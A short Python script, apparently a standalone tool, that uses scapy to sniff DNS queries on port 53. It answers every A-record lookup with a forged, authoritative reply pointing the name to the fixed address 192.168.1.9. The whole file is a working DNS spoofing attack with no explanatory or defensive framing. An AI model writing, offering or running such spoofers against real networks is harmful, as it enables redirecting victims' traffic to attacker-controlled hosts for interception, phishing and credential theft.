from scapy.all import *




def handle_dns_query(packet):
    if packet.haslayer(DNSQR) and packet[DNSQR].qtype == 1:  # Check for A query
        queried_host = packet[DNSQR].qname.decode('utf-8')[:-1]
        print(f"Received DNS query for {queried_host} (Type: A)")
        dns_response = IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                       DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=DNSRR(rrname=queried_host + ".", type=1, rdata='192.168.1.9'))
        send(dns_response)



sniff(filter="udp and port 53", prn=handle_dns_query)

